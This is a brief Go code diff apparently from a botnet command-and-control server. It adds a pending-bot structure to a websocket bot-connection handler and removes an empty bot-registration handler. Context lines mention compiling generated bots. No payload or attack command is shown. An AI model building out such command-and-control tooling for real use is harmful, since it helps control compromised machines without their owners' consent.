@@ -34,6 +34,10 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	pb := PendingBots{
+		Conn: con,
+	}
+
 	ctx := context.Background()
 	if err := wsjson.Read(ctx, con, &b); err != nil {
 		log.Println("Error reading the initial data of the bot : ", err)
@@ -183,9 +187,5 @@ func (c *c2) GenerateBot(w http.ResponseWriter, r *http.Request) {
 		log.Println("Compilation Failed: ", string(out))
 		return
 	}
-
-}
-
-func (c *c2) RegisterBots(w http.ResponseWriter, r *http.Request) {
 
 }
